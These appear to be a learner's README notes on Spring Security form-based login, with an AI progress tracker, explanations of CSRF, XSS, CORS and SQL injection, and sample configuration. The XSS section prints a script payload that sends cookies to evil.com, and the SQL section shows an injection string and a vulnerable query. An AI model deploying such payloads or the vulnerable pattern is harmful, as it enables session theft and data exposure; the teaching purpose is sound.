# Spring Security - Form Based Login

A learning project to understand Spring Security fundamentals and implement form-based authentication.

---

## Claude Memory - Progress Tracker

### Current Status
**Phase**: Learning & Notes
**Last Updated**: 2026-01-09

### Completed
- [x] Security fundamentals notes (CSRF, XSS, CORS, SQL Injection)
- [x] Authentication vs Authorization concepts
- [x] Spring Security Architecture overview
- [x] Form-based login theory and configuration

### Next Steps (TODO)
- [ ] Initialize Spring Boot project with dependencies
- [ ] Create basic project structure
- [ ] Configure SecurityFilterChain
- [ ] Set up in-memory users for testing
- [ ] Create custom login page (Thymeleaf)
- [ ] Create protected dashboard page
- [ ] Implement database-backed UserDetailsService
- [ ] Add role-based access control (USER, ADMIN)
- [ ] Configure remember-me functionality
- [ ] Implement logout with session invalidation
- [ ] Add session management (max sessions)
- [ ] Test all security features

### Implementation Notes
```
Project: spring-security-form-based
Build Tool: Maven/Gradle (TBD)
Java Version: TBD
Spring Boot Version: TBD
Template Engine: Thymeleaf
Database: H2 (dev) / PostgreSQL (prod) - TBD
```

---

## Security Fundamentals

### CSRF (Cross-Site Request Forgery)

**What is it?**
- An attack that tricks authenticated users into submitting malicious requests
- Exploits the trust a website has in a user's browser
- Attacker crafts a request that performs actions on behalf of the victim

**How it works:**
1. User logs into legitimate site (e.g., bank.com)
2. User visits malicious site while still logged in
3. Malicious site contains hidden form/script targeting bank.com
4. Browser automatically includes session cookies
5. Bank.com processes the request as legitimate

**Prevention in Spring Security:**
- CSRF tokens: unique, unpredictable values included in forms
- Token must match on subsequent requests
- Spring Security enables CSRF protection by default
- Token is stored in session and must be included in POST/PUT/DELETE requests

```java
// CSRF is enabled by default in Spring Security
// To customize:
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
);

// To disable (not recommended for browser-based apps):
http.csrf(csrf -> csrf.disable());
```

---

### XSS (Cross-Site Scripting)

**What is it?**
- Injection of malicious scripts into trusted websites
- Scripts execute in victim's browser context
- Can steal cookies, session tokens, sensitive data

**Types:**
1. **Stored XSS**: Malicious script stored on server (e.g., in database)
2. **Reflected XSS**: Script reflected off server in error messages, search results
3. **DOM-based XSS**: Vulnerability in client-side code

**Example Attack:**
```html
<!-- Attacker submits this as a comment -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

**Prevention:**
- **Output Encoding**: Escape HTML entities before rendering
- **Content Security Policy (CSP)**: Restrict script sources
- **HttpOnly Cookies**: Prevent JavaScript access to session cookies
- **Input Validation**: Validate and sanitize user input

```java
// Spring Security headers for XSS protection
http.headers(headers -> headers
    .xssProtection(xss -> xss.enable())
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("script-src 'self'")
    )
);
```

---

### CORS (Cross-Origin Resource Sharing)

**What is it?**
- Browser security feature restricting cross-origin HTTP requests
- Prevents malicious sites from reading data from other origins
- Origin = protocol + domain + port

**Same-Origin Policy:**
- Browser blocks requests from different origins by default
- CORS provides controlled relaxation of this policy

**How CORS works:**
1. Browser sends preflight OPTIONS request for certain methods
2. Server responds with allowed origins, methods, headers
3. If allowed, browser sends actual request

**CORS Headers:**
- `Access-Control-Allow-Origin`: Allowed origins
- `Access-Control-Allow-Methods`: Allowed HTTP methods
- `Access-Control-Allow-Headers`: Allowed request headers
- `Access-Control-Allow-Credentials`: Allow cookies/auth

**Spring Security CORS Configuration:**
```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://trusted-site.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
    config.setAllowedHeaders(List.of("*"));
    config.setAllowCredentials(true);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}

// In security config
http.cors(cors -> cors.configurationSource(corsConfigurationSource()));
```

---

### SQL Injection

**What is it?**
- Insertion of malicious SQL code through user input
- Can read, modify, or delete database data
- Can bypass authentication

**Example Attack:**
```sql
-- User input: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
-- This returns all users!
```

**Prevention:**
1. **Parameterized Queries / Prepared Statements** (Primary defense)
2. **ORM frameworks** (JPA/Hibernate handle escaping)
3. **Input validation**
4. **Least privilege database accounts**

```java
// VULNERABLE - Never do this!
String query = "SELECT * FROM users WHERE username = '" + username + "'";

// SAFE - Use parameterized queries
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// SAFE - JPA Repository methods
userRepository.findByUsername(username);
```

---

## Authentication vs Authorization

| Aspect | Authentication | Authorization |
|--------|----------------|---------------|
| **Definition** | Verifying WHO you are | Verifying WHAT you can do |
| **Question** | "Are you who you claim to be?" | "Do you have permission?" |
| **Order** | Happens first | Happens after authentication |
| **Methods** | Passwords, biometrics, tokens | Roles, permissions, policies |
| **Spring Security** | AuthenticationManager | AccessDecisionManager |
| **HTTP Status** | 401 Unauthorized | 403 Forbidden |

**Authentication Examples:**
- Login with username/password
- OAuth2/Social login
- Certificate-based auth
- Multi-factor authentication

**Authorization Examples:**
- Admin can delete users
- Users can only view their own data
- Managers can approve requests
- API rate limiting per role

---

## Spring Security Architecture

### Core Components

```
┌─────────────────────────────────────────────────────────────────┐
│                        HTTP Request                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    DelegatingFilterProxy                         │
│         (Bridge between Servlet Container & Spring)              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                   FilterChainProxy                               │
│              (Manages Security Filter Chain)                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                  Security Filter Chain                           │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ SecurityContextPersistenceFilter                          │   │
│  │ UsernamePasswordAuthenticationFilter                      │   │
│  │ BasicAuthenticationFilter                                 │   │
│  │ ExceptionTranslationFilter                                │   │
│  │ FilterSecurityInterceptor / AuthorizationFilter           │   │
│  │ ... (15+ filters in default chain)                        │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                      Your Controller                             │
└─────────────────────────────────────────────────────────────────┘
```

### Key Components Explained

**1. SecurityContextHolder**
- Stores security context (authenticated user details)
- Uses ThreadLocal by default
- Access current user: `SecurityContextHolder.getContext().getAuthentication()`

**2. Authentication**
- Represents the token for authentication request OR authenticated principal
- Contains: principal, credentials, authorities, authenticated flag

**3. AuthenticationManager**
- Main interface for authentication
- Single method: `authenticate(Authentication)`
- Default implementation: ProviderManager

**4. AuthenticationProvider**
- Performs specific type of authentication
- Examples: DaoAuthenticationProvider, JwtAuthenticationProvider
- Multiple providers can be chained

**5. UserDetailsService**
- Loads user-specific data
- Single method: `loadUserByUsername(String username)`
- Returns UserDetails object

**6. PasswordEncoder**
- Encodes passwords securely
- Recommended: BCryptPasswordEncoder
- Handles password verification

### Authentication Flow

```
┌──────────┐     ┌─────────────────────┐     ┌─────────────────────┐
│  User    │────▶│ AuthenticationFilter │────▶│ AuthenticationManager│
└──────────┘     └─────────────────────┘     └─────────────────────┘
                                                        │
                                                        ▼
┌──────────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│ SecurityContextHolder│◀────│   Authentication  │◀────│ AuthenticationProvider│
└──────────────────────┘     └──────────────────┘     └─────────────────────┘
                                                        │
                                                        ▼
                                              ┌─────────────────────┐
                                              │  UserDetailsService  │
                                              └─────────────────────┘
                                                        │
                                                        ▼
                                              ┌─────────────────────┐
                                              │    UserDetails       │
                                              └─────────────────────┘
```

---

## Form-Based Login

### How It Works

1. **User accesses protected resource**
2. **ExceptionTranslationFilter** catches AccessDeniedException
3. **AuthenticationEntryPoint** redirects to login page
4. User submits credentials via HTML form
5. **UsernamePasswordAuthenticationFilter** intercepts POST to /login
6. Creates **UsernamePasswordAuthenticationToken**
7. **AuthenticationManager** validates credentials
8. On success: SecurityContext updated, redirect to original URL
9. On failure: Redirect to login page with error

### Default Behavior

Spring Security auto-generates:
- Login page at `/login`
- Logout endpoint at `/logout`
- Accepts POST with `username` and `password` parameters

### Configuration

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**", "/css/**", "/js/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .formLogin(form -> form
                .loginPage("/login")                    // Custom login page
                .loginProcessingUrl("/authenticate")    // Form action URL
                .usernameParameter("email")             // Custom username field
                .passwordParameter("pass")              // Custom password field
                .defaultSuccessUrl("/dashboard", true)  // Redirect after login
                .failureUrl("/login?error=true")        // Redirect on failure
                .successHandler(customSuccessHandler()) // Custom success logic
                .failureHandler(customFailureHandler()) // Custom failure logic
                .permitAll()
            )
            .logout(logout -> logout
                .logoutUrl("/logout")
                .logoutSuccessUrl("/login?logout=true")
                .invalidateHttpSession(true)
                .deleteCookies("JSESSIONID")
                .permitAll()
            )
            .sessionManagement(session -> session
                .maximumSessions(1)                     // One session per user
                .expiredUrl("/login?expired=true")
            );

        return http.build();
    }

    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails user = User.builder()
            .username("user")
            .password(passwordEncoder().encode("password"))
            .roles("USER")
            .build();

        UserDetails admin = User.builder()
            .username("admin")
            .password(passwordEncoder().encode("admin"))
            .roles("ADMIN", "USER")
            .build();

        return new InMemoryUserDetailsManager(user, admin);
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

### Custom Login Page (Thymeleaf)

```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Login</title>
</head>
<body>
    <h1>Login</h1>

    <!-- Error message -->
    <div th:if="${param.error}" class="error">
        Invalid username or password
    </div>

    <!-- Logout message -->
    <div th:if="${param.logout}" class="success">
        You have been logged out
    </div>

    <form th:action="@{/login}" method="post">
        <div>
            <label>Username:</label>
            <input type="text" name="username" required/>
        </div>
        <div>
            <label>Password:</label>
            <input type="password" name="password" required/>
        </div>
        <!-- CSRF token automatically included by Thymeleaf -->
        <button type="submit">Login</button>
    </form>
</body>
</html>
```

### Remember-Me Authentication

```java
http.rememberMe(remember -> remember
    .key("uniqueAndSecretKey")
    .tokenValiditySeconds(86400 * 7)  // 7 days
    .rememberMeParameter("remember")   // Checkbox name
    .userDetailsService(userDetailsService)
);
```

### Session Management

```java
http.sessionManagement(session -> session
    .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
    .invalidSessionUrl("/login?invalid-session")
    .maximumSessions(1)
    .maxSessionsPreventsLogin(true)  // Prevent new login if max reached
);
```

---

## Best Practices

1. **Always use HTTPS** in production
2. **Never store plain-text passwords** - use BCrypt
3. **Enable CSRF protection** for browser-based apps
4. **Use secure session cookies** (HttpOnly, Secure flags)
5. **Implement proper logout** - invalidate session
6. **Rate limit login attempts** - prevent brute force
7. **Log authentication events** - for security auditing
8. **Use method-level security** for fine-grained control

---

## Resources

- [Spring Security Reference Documentation](https://docs.spring.io/spring-security/reference/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Spring Security Architecture](https://spring.io/guides/topicals/spring-security-architecture)
